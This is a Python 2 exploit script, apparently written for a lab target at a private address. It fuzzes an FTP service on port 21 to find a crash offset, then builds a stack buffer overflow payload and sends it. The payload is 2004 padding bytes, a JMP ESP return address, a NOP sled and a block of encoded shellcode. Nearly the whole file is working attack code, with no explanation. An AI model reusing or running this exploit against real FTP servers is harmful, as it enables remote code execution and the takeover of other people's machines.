import socket

i = 2004
'''
for i in range(1,10000):
	try:
		print "Trying %i " % i
		badstr="A" * i
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect(("192.168.174.132", 21))
		sock.settimeout(5)
		sock.send(badstr)
		print sock.recv(1024)
		sock.close()
	except:
		print "Crash at %i" % i 
		break	
'''
pad = 'A' * i
eip = "\x9F\xF3\xD1\x74" #756EF39F   FFE4             JMP ESP
		#74D1F39F   FFE4             JMP ESP

buf =  ""
buf += "\xbe\xeb\x25\xfd\xc2\xd9\xc7\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x56\x31\x77\x13\x83\xc7\x04\x03\x77\xe4\xc7"
buf += "\x08\x3e\x12\x85\xf3\xbf\xe2\xea\x7a\x5a\xd3\x2a\x18"
buf += "\x2e\x43\x9b\x6a\x62\x6f\x50\x3e\x97\xe4\x14\x97\x98"
buf += "\x4d\x92\xc1\x97\x4e\x8f\x32\xb9\xcc\xd2\x66\x19\xed"
buf += "\x1c\x7b\x58\x2a\x40\x76\x08\xe3\x0e\x25\xbd\x80\x5b"
buf += "\xf6\x36\xda\x4a\x7e\xaa\xaa\x6d\xaf\x7d\xa1\x37\x6f"
buf += "\x7f\x66\x4c\x26\x67\x6b\x69\xf0\x1c\x5f\x05\x03\xf5"
buf += "\xae\xe6\xa8\x38\x1f\x15\xb0\x7d\xa7\xc6\xc7\x77\xd4"
buf += "\x7b\xd0\x43\xa7\xa7\x55\x50\x0f\x23\xcd\xbc\xae\xe0"
buf += "\x88\x37\xbc\x4d\xde\x10\xa0\x50\x33\x2b\xdc\xd9\xb2"
buf += "\xfc\x55\x99\x90\xd8\x3e\x79\xb8\x79\x9a\x2c\xc5\x9a"
buf += "\x45\x90\x63\xd0\x6b\xc5\x19\xbb\xe3\x2a\x10\x44\xf3"
buf += "\x24\x23\x37\xc1\xeb\x9f\xdf\x69\x63\x06\x27\xf8\x63"
buf += "\xb9\xf7\x42\xe3\x47\xf8\xb2\x2d\x8c\xac\xe2\x45\x25"
buf += "\xcd\x69\x96\xca\x18\x07\x9c\x5c\x63\x7f\x0e\x1f\x0b"
buf += "\x7d\x4f\x31\x90\x08\xa9\x61\x78\x5a\x66\xc2\x28\x1a"
buf += "\xd6\xaa\x22\x95\x09\xca\x4c\x7c\x22\x61\xa3\x28\x1a"
buf += "\x1e\x5a\x71\xd0\xbf\xa3\xac\x9c\x80\x28\x44\x60\x4e"
buf += "\xd9\x2d\x72\xa7\xbe\xcd\x8a\x38\x2b\xcd\xe0\x3c\xfd"
buf += "\x9a\x9c\x3e\xd8\xec\x02\xc0\x0f\x6f\x44\x3e\xce\x59"
buf += "\x3e\x09\x44\xe5\x28\x76\x88\xe5\xa8\x20\xc2\xe5\xc0"
buf += "\x94\xb6\xb6\xf5\xda\x62\xab\xa5\x4e\x8d\x9d\x1a\xd8"
buf += "\xe5\x23\x44\x2e\xaa\xdc\xa3\x2c\xad\x22\x31\x1b\x16"
buf += "\x4a\xc9\x1b\xa6\x8a\xa3\x9b\xf6\xe2\x38\xb3\xf9\xc2"
buf += "\xc1\x1e\x52\x4a\x4b\xcf\x10\xeb\x4c\xda\xf5\xb5\x4d"
buf += "\xe9\x2d\x46\x37\x82\xd2\xa7\xc8\x8a\xb6\xa8\xc8\xb2"
buf += "\xc8\x95\x1e\x8b\xbe\xd8\xa2\xa8\xb1\x6f\x86\x99\x5b"
buf += "\x8f\x94\xda\x49"

badstr = pad + eip + "\x90"*20 + buf + "\r\n"

sock = socket.socket()
sock.connect(("192.168.174.132", 21))
print sock.recv(1024)
sock.send(badstr)
print sock.recv(1024)
